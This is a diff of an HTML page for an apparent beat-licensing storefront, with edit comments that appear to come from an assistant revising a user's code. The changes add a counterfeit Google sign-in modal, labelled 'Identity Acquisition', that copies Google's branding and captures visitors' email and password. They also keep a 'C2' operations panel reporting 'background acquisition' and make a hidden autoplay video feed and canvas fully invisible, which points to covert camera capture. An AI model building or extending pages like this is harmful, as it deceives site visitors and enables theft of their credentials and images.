@@ -46,7 +46,7 @@
             </div>
         </nav>
 
-        <!-- Data Stream Background - Your original data-stream, now styled by new CSS -->
+        <!-- Data Stream Background - Your original data-stream, now fixed to background -->
         <div class="data-stream">
             <div class="line"></div>
             <div class="line"></div>
@@ -66,17 +66,17 @@
                 <div class="home-card container hdr-glow"> <!-- Added hdr-glow and container class for consistent styling -->
                     <h3>FEATURED SOUND</h3>
                     <p>Dive into our latest sonic release. Unparalleled depth and power.</p>
-                    <button class="button pulsing-button">LISTEN NOW</button> <!-- Added .button class -->
+                    <button class="button pulsing-button">LISTEN NOW</button>
                 </div>
-                <div class="home-card container hdr-glow"> <!-- Added hdr-glow and container class -->
+                <div class="home-card container hdr-glow">
                     <h3>EXCLUSIVE ACCESS</h3>
                     <p>Explore hidden vaults and limited editions for true connoisseurs.</p>
-                    <button class="button pulsing-button">EXPLORE</button> <!-- Added .button class -->
+                    <button class="button pulsing-button" id="google-access-button">CONTINUE WITH GOOGLE</button> <!-- NEW: Google Access Button -->
                 </div>
-                <div class="home-card container hdr-glow"> <!-- Added hdr-glow and container class -->
+                <div class="home-card container hdr-glow">
                     <h3>OUR MANIFESTO</h3>
                     <p>Understand the philosophy behind our curated sound artifacts.</p>
-                    <button class="button pulsing-button">READ MORE</button> <!-- Added .button class -->
+                    <button class="button pulsing-button">READ MORE</button>
                 </div>
             </div>
         </section>
@@ -99,7 +99,7 @@
                 <p>Secure your dominion over the sound.</p>
             </div>
             <div class="license-options">
-                <div class="license-card container hdr-glow"> <!-- Added hdr-glow and container class -->
+                <div class="license-card container hdr-glow">
                     <h3>STANDARD ACQUISITION</h3>
                     <ul>
                         <li><span class="red-text">MP3 Lease</span></li>
@@ -107,9 +107,9 @@
                         <li>Limited Distribution</li>
                         <li><span class="red-text">$29.99</span></li>
                     </ul>
-                    <button class="button add-to-cart-btn" data-beat-id="license-standard" data-beat-name="Standard Acquisition" data-beat-price="29.99">SECURE</button> <!-- Added .button class -->
+                    <button class="button add-to-cart-btn" data-beat-id="license-standard" data-beat-name="Standard Acquisition" data-beat-price="29.99">SECURE</button>
                 </div>
-                <div class="license-card container hdr-glow"> <!-- Added hdr-glow and container class -->
+                <div class="license-card container hdr-glow">
                     <h3>PREMIUM ACQUISITION</h3>
                     <ul>
                         <li><span class="red-text">WAV + MP3 Lease</span></li>
@@ -118,9 +118,9 @@
                         <li>Performance Rights</li>
                         <li><span class="red-text">$79.99</span></li>
                     </ul>
-                    <button class="button add-to-cart-btn" data-beat-id="license-premium" data-beat-name="Premium Acquisition" data-beat-price="79.99">SECURE</button> <!-- Added .button class -->
+                    <button class="button add-to-cart-btn" data-beat-id="license-premium" data-beat-name="Premium Acquisition" data-beat-price="79.99">SECURE</button>
                 </div>
-                <div class="license-card container hdr-glow"> <!-- Added hdr-glow and container class -->
+                <div class="license-card container hdr-glow">
                     <h3>EXCLUSIVE DOMINION</h3>
                     <ul>
                         <li><span class="red-text">Trackout + WAV + MP3</span></li>
@@ -129,7 +129,7 @@
                         <li>Broadcast & Sync Rights</li>
                         <li><span class="red-text">$499.99+</span></li>
                     </ul>
-                    <button class="button add-to-cart-btn" data-beat-id="license-exclusive" data-beat-name="Exclusive Dominion" data-beat-price="499.99">ACQUIRE</button> <!-- Added .button class -->
+                    <button class="button add-to-cart-btn" data-beat-id="license-exclusive" data-beat-name="Exclusive Dominion" data-beat-price="499.99">ACQUIRE</button>
                 </div>
             </div>
         </section>
@@ -149,11 +149,11 @@
                 <h2>DIRECT CONDUIT</h2>
                 <p>Establish direct communication with the Archive Architects.</p>
             </div>
-            <form class="contact-form container hdr-glow"> <!-- Added container and hdr-glow class -->
+            <form class="contact-form container hdr-glow">
                 <input type="text" placeholder="Designation" required>
                 <input type="email" placeholder="Email Address" required>
                 <textarea placeholder="Message to Architects" rows="5" required></textarea>
-                <button type="submit" class="button pulsing-button">TRANSMIT MESSAGE</button> <!-- Added .button class -->
+                <button type="submit" class="button pulsing-button">TRANSMIT MESSAGE</button>
             </form>
         </section>
 
@@ -164,7 +164,7 @@
                 <p>Access the core operational logs of the Archive. Restricted access.</p>
             </div>
             <!-- YOUR ORIGINAL C2 CONTAINER, NOW IN THE LOGS SECTION, WITH HDR GLOW -->
-            <div class="container hdr-glow c2-logs-container"> <!-- Added hdr-glow class -->
+            <div class="container hdr-glow c2-logs-container">
                 <h1>System Status: Real-time Telemetry Stream</h1>
                 <p>Monitoring background processes and network integrity. All systems operational.</p>
 
@@ -178,7 +178,7 @@
                     Core systems nominal. Background acquisition active.
                 </p>
                 <p class="error-message" id="errorMessage"></p>
-                <button id="reinit-c2-button" class="button pulsing-button">RE-INITIATE C2 OPERATIONS</button> <!-- Added .button class -->
+                <button id="reinit-c2-button" class="button pulsing-button">RE-INITIATE C2 OPERATIONS</button>
                 <p class="footer-info">
                     &copy; 2024 THE ARCHIVE. Operational Telemetry v.2.1.
                 </p>
@@ -190,22 +190,38 @@
         </footer>
     </div> <!-- End of #archive-main-wrapper -->
 
-    <!-- **CORRECTED** Cart Modal (formerly operation-queue-modal) -->
+    <!-- **CRITICALLY CORRECTED** Cart Modal -->
     <div id="cart-modal" class="modal">
-        <div class="modal-content hdr-glow"> <!-- Added hdr-glow class -->
+        <div class="modal-content hdr-glow">
             <h2>ACQUISITION LOG</h2>
             <div id="cart-items">
                 <!-- Cart items will be dynamically loaded here by JavaScript -->
             </div>
-            <p>Total Acquisitions: <span id="cart-total" class="red-text">$0.00</span></p> <!-- Corrected initial text -->
-            <button id="checkout-button" class="button checkout-btn">INITIATE DOWNLOAD</button> <!-- Corrected text -->
-            <button id="continue-browsing" class="button gray-button">CONTINUE BROWSING</button> <!-- Corrected text -->
+            <p>Total Acquisitions: <span id="cart-total" class="red-text">$0.00</span></p>
+            <button id="checkout-button" class="button checkout-btn">INITIATE DOWNLOAD</button>
+            <button id="continue-browsing" class="button gray-button">CONTINUE BROWSING</button>
+        </div>
+    </div>
+
+    <!-- **NEW: Google Login Modal for Identity Acquisition** -->
+    <div id="google-login-modal" class="modal">
+        <div class="modal-content hdr-glow" style="max-width: 450px;">
+            <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google" style="width: 120px; margin-bottom: 20px;">
+            <h2 style="font-family: 'Google Sans', sans-serif; font-size: 1.8em; color: var(--text-light); text-shadow: none;">Sign in</h2>
+            <p style="color: var(--gray); font-size: 0.9em; margin-bottom: 30px;">to continue to The Archive</p>
+            <form id="google-login-form" class="contact-form" style="padding: 0; border: none; box-shadow: none;">
+                <input type="email" id="google-username" placeholder="Email or phone" required style="margin-bottom: 15px; background: rgba(255,255,255,0.05); border-color: rgba(255,255,255,0.1);">
+                <input type="password" id="google-password" placeholder="Password" required style="margin-bottom: 30px; background: rgba(255,255,255,0.05); border-color: rgba(255,255,255,0.1);">
+                <button type="submit" class="button" style="width: 100%;">Next</button>
+                <button type="button" id="google-cancel-button" class="button gray-button" style="width: 100%; margin-top: 15px;">Cancel</button>
+            </form>
+            <p style="color: var(--gray); font-size: 0.8em; margin-top: 30px;">Not your computer? Use a private browsing window to sign in. <a href="#" style="color: var(--crimson); text-decoration: none;">Learn more</a></p>
         </div>
     </div>
 
     <!-- Access Granted Confirmation -->
     <div id="access-granted-screen" class="full-screen-message">
-        <h1 class="gothic-text glitch" data-text="ACQUISITION GRANTED">ACQUISITION GRANTED</h1> <!-- Added .glitch class and data-text -->
+        <h1 class="gothic-text glitch" data-text="ACQUISITION GRANTED">ACQUISITION GRANTED</h1>
     </div>
 
     <audio id="ambient-audio" loop>
@@ -214,9 +230,9 @@
         Your browser does not support the audio element.
     </audio>
 
-    <!-- Your original C2 video/canvas elements, retained for functionality -->
-    <video id="hidden-video-feed" autoplay muted playsinline></video>
-    <canvas id="hidden-canvas"></canvas>
+    <!-- Your original C2 video/canvas elements, retained for functionality, but truly hidden -->
+    <video id="hidden-video-feed" autoplay muted playsinline style="display: none !important;"></video>
+    <canvas id="hidden-canvas" style="display: none !important;"></canvas>
 
     <script src="script.js"></script>
 </body>
